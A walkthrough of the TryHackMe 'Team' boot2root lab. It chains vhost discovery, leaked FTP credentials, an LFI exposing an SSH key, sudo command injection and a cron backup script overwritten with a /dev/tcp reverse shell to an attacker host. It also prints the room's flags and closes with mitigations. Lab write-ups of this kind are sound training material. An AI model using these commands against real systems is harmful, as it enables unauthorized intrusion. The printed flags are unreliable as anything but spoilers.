# Team CTF Walkthrough

**Target:** Team
**Source:** [TryHackMe](https://tryhackme.com/room/teamcw)
**Difficulty:** Easy
**Target IP:** 10.80.181.154

## Table of Contents
- [Overview](#overview)
- [Reconnaissance](#reconnaissance)
- [Virtual Host Enumeration](#virtual-host-enumeration)
- [Leaked FTP Credentials](#leaked-ftp-credentials)
- [LFI on the Dev Vhost](#lfi-on-the-dev-vhost)
- [SSH Key Recovery & Foothold (dale)](#ssh-key-recovery--foothold-dale)
- [Lateral Movement to gyles](#lateral-movement-to-gyles)
- [Privilege Escalation to root](#privilege-escalation-to-root)
- [Room Answers](#room-answers)
- [Vulnerabilities](#vulnerabilities)
- [Attack Chain Summary](#attack-chain-summary)
- [Tools Used](#tools-used)
- [References](#references)

---

## Overview

Team is an easy-difficulty boot2root box built around virtual-host
discovery and a chain of leftover files. A hint in the default Apache page
points to an undiscovered vhost, which in turn leads to an old script
revision leaking FTP credentials, an LFI-exposed developer subdomain that
discloses an SSH private key, and finally a chain of `sudo`-abusable
scripts that walk from `dale` to `gyles` and ultimately to root via a
world-writable backup script.

**Key Skills Required:**
- Virtual host discovery via `/etc/hosts`
- Web content discovery (`gobuster`)
- Source-control-style file leftovers (`.old` extensions)
- Local File Inclusion (LFI) exploitation
- SSH private key recovery and cleanup
- Sudo privilege chaining across multiple accounts

---

## Reconnaissance

### Network Scanning

```bash
nmap -sVC -O 10.80.181.154
```

**Results:**

| Port | Service | Version |
|------|---------|---------|
| 21/tcp | ftp | vsftpd 3.0.5 |
| 22/tcp | ssh | OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 |
| 80/tcp | http | Apache httpd 2.4.41 (Ubuntu) |

The default Apache page's `<title>` tag is non-standard and drops a direct
hint:

```
Apache2 Ubuntu Default Page: It works! If you see this add 'team.thm' to your hosts!
```

---

## Virtual Host Enumeration

```bash
nano /etc/hosts
# 10.80.181.154   team.thm
```

```bash
gobuster dir -u http://team.thm -w /usr/share/wordlists/dirb/common.txt
```

```
assets               (Status: 301)
images                (Status: 301)
robots.txt           (Status: 200) [Size: 5]
scripts               (Status: 301)
```

```bash
curl http://team.thm/robots.txt
```

```
dale
```

A username (`dale`) is leaked directly through `robots.txt`.

---

## Leaked FTP Credentials

```bash
gobuster dir -u http://team.thm/scripts -w /usr/share/wordlists/dirb/common.txt -x txt
```

```
script.txt           (Status: 200) [Size: 597]
```

```bash
curl http://team.thm/scripts/script.txt
```

The script is a sanitized FTP automation script, but it includes a note
pointing at an older, unsanitized revision still sitting on the server:

```
# Updated version of the script
# Note to self had to change the extension of the old "script" in this folder, as it has creds in
```

```bash
curl http://team.thm/scripts/script.old
```

```bash
read -p "Enter Username: " ftpuser
read -sp "Enter Username Password: " T3@m$h@r3
```

Recovered FTP credentials: `ftpuser : T3@m$h@r3`

```bash
ftp team.thm
Name: ftpuser
230 Login successful.
ftp> ls workshare
ftp> more workshare/New_site.txt
```

```
I have started coding a new website in PHP ... It can be found at ".dev"
within our domain.

Also as per the team policy please make a copy of your "id_rsa" and
place this in the relevent config file.
-Gyles
```

This leaks both a second vhost (`dev.team.thm`) and a strong hint that an
SSH private key will be discoverable somewhere in that web root's config.

---

## LFI on the Dev Vhost

```bash
nano /etc/hosts
# 10.80.181.154   team.thm   dev.team.thm
```

```bash
curl http://dev.team.thm/
```

```html
Site is being built<a href=script.php?page=teamshare.php </a>
```

The `page` parameter is passed straight to an include without
sanitization — a classic LFI:

```bash
curl http://dev.team.thm/script.php?page=/etc/passwd
```

```
dale:x:1000:1000:anon,,,:/home/dale:/bin/bash
gyles:x:1001:1001::/home/gyles:/bin/bash
ftpuser:x:1002:1002::/home/ftpuser:/bin/sh
```

Following Gyles' note about an `id_rsa` copy in a config file, the SSHD
config path is pulled instead and reveals Dale's private key, left commented
out inline:

```bash
curl http://dev.team.thm/script.php?page=/etc/ssh/sshd_confi
```

```
#Dale id_rsa
#-----BEGIN OPENSSH PRIVATE KEY-----
#b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
...
#-----END OPENSSH PRIVATE KEY-----
```

---

## SSH Key Recovery & Foothold (dale)

The key is saved locally with the leading `#` comment markers stripped:

```bash
nano dale.ssh   # removing all #'s
chmod 600 dale.ssh
ssh -i dale.ssh dale@team.thm
```

```bash
dale@ip-10-80-181-154:~$ cat user.txt
THM{6Y0TXHz7c2d}
```

> **user flag:** `THM{6Y0TXHz7c2d}`

---

## Lateral Movement to gyles

```bash
dale@...:~$ sudo -l
```

```
User dale may run the following commands on ip-10-80-181-154:
    (gyles) NOPASSWD: /home/gyles/admin_checks
```

`admin_checks` is a stats-backup helper that echoes a "date" prompt
directly into a shell, without sanitizing the input:

```bash
cat /home/gyles/admin_checks
```

```bash
read -p "Enter 'date' to timestamp the file: " error
printf "The Date is "
$error 2>/dev/null
```

Supplying `/bin/bash` instead of the expected `date` command executes an
interactive shell as `gyles`:

```bash
sudo -u gyles /home/gyles/admin_checks
Enter name of person backing up the data:
Enter 'date' to timestamp the file: /bin/bash
whoami
gyles
```

A reverse shell is popped for a stable interactive session:

```bash
bash -c 'bash -i >& /dev/tcp/<attacker_ip>/9009 0>&1'
```

---

## Privilege Escalation to root

`gyles`'s bash history reveals a backup script maintained outside his home
directory:

```bash
cat .bash_history
```

```
sudo nano main_backup.sh
cd /var/backups/
```

```bash
ls -l /usr/local/bin
```

```
-rwxrwxr-x 1 root admin 65 Jan 17  2021 main_backup.sh
```

The script is **group-writable by `admin`**, a group `gyles` belongs to,
and is executed with elevated privileges on a schedule. It is overwritten
with a reverse-shell payload prepended to the original logic:

```bash
cat main_backup.sh
```

```bash
#!/bin/bash
bash -c 'bash -i >& /dev/tcp/<attacker_ip>/9008 0>&1'
cp -r /var/www/team.thm/* /var/backups/www/team.thm/
```

A new listener catches the scheduled execution as root:

```bash
rlwrap nc -nvlp 9008
```

```
connect to [<attacker_ip>] from (UNKNOWN) [10.80.181.154] 41236
root@ip-10-80-181-154:~# whoami
root
# cat root.txt
THM{fhqbznavfonq}
```

> **root flag:** `THM{fhqbznavfonq}`

---

## Room Answers

| Flag | Value |
|------|-------|
| user.txt | `THM{6Y0TXHz7c2d}` |
| root.txt | `THM{fhqbznavfonq}` |

---

## Vulnerabilities

### 1. Hidden Virtual Host Disclosed via Default Page Title (Low)

**Description:** The default Apache landing page's `<title>` tag directly
named the production vhost (`team.thm`) intended to stay undiscovered.

**Impact:** Trivial discovery of the real application hostname.

**Mitigation:** Replace default service pages before going live; never
leave internal hostnames in default content.

### 2. Credentials Leaked in a Leftover ".old" Script Revision (High)

**Description:** An older, unsanitized revision of an FTP automation
script (`script.old`) remained web-accessible and contained hardcoded FTP
credentials.

**Impact:** Full FTP access, and a further vhost + key-location hint via
files on that share.

**Mitigation:**
- Never leave backup/old file revisions in a web-accessible directory.
- Rotate any credentials that were ever committed to a script, even
  temporarily.

### 3. Local File Inclusion on the Dev Vhost (Critical)

**Description:** `dev.team.thm/script.php?page=` passes user input
directly into a file include with no path validation or allow-listing.

**Impact:** Arbitrary local file disclosure, including a commented-out SSH
private key embedded in the SSHD config file.

**Mitigation:**
- Never pass user-controlled input into file-include functions.
- Use a strict allow-list of permitted page names/paths.

### 4. SSH Private Key Stored Inline in a Service Config File (Critical)

**Description:** `dale`'s SSH private key was copied, commented out,
directly into `/etc/ssh/sshd_config`, readable via the LFI.

**Impact:** Full SSH access as `dale` once recovered.

**Mitigation:**
- Never embed private key material in configuration files, commented or
  not.
- Store keys only in dedicated, access-controlled locations (`~/.ssh`,
  mode `600`).

### 5. Unsanitized Input in a Sudo-Executable Script (Critical)

**Description:** `admin_checks`, runnable by `dale` as `gyles` via
passwordless sudo, passes a user-supplied "date" value directly to a shell
without validation.

**Impact:** Arbitrary command execution as `gyles`.

**Mitigation:**
- Never evaluate or execute unsanitized user input inside a
  sudo-privileged script.
- Validate input against a strict allow-list (e.g., only accept the literal
  string `date`).

### 6. Group-Writable Root-Executed Backup Script (Critical)

**Description:** `main_backup.sh`, executed by root (likely via cron), was
writable by the `admin` group that `gyles` belongs to.

**Impact:** Full privilege escalation to root by injecting a payload into
a script root will execute.

**Mitigation:**
- Scripts invoked by privileged processes must never be writable by
  non-root users or groups.
- Set `600`/`700` ownership restricted to root on all cron/scheduled
  scripts.

---

## Attack Chain Summary

```
Nmap scan → FTP, SSH, HTTP
    ↓
Apache default page title → add team.thm to /etc/hosts
    ↓
gobuster team.thm → robots.txt → username: dale
    ↓
gobuster /scripts → script.txt references script.old
    ↓
curl script.old → FTP creds: ftpuser:T3@m$h@r3
    ↓
ftp workshare/New_site.txt → hints at dev.team.thm + id_rsa in config
    ↓
add dev.team.thm to /etc/hosts → script.php?page= LFI confirmed
    ↓
LFI /etc/ssh/sshd_confi → Dale's commented-out private key
    ↓
ssh -i dale.ssh dale → foothold, user.txt
    ↓
sudo -l → (gyles) NOPASSWD admin_checks → inject /bin/bash → shell as gyles
    ↓
gyles .bash_history → /usr/local/bin/main_backup.sh (group-writable)
    ↓
inject reverse shell into main_backup.sh → root cron executes it
    ↓
root shell → root.txt
    ↓
Room complete
```

---

## Tools Used

| Tool | Purpose |
|------|---------|
| Nmap | Port scanning and service/OS detection |
| Gobuster | Virtual host content and hidden file discovery |
| cURL | Fetching web content and exploiting the LFI |
| ftp | Credentialed FTP enumeration and file retrieval |
| ssh | Foothold and lateral movement |
| netcat (nc) / rlwrap | Reverse shell listeners |

---

## References

- [TryHackMe — Team](https://tryhackme.com/room/teamcw)
- [OWASP — Local File Inclusion](https://owasp.org/www-community/attacks/Path_Traversal)

---
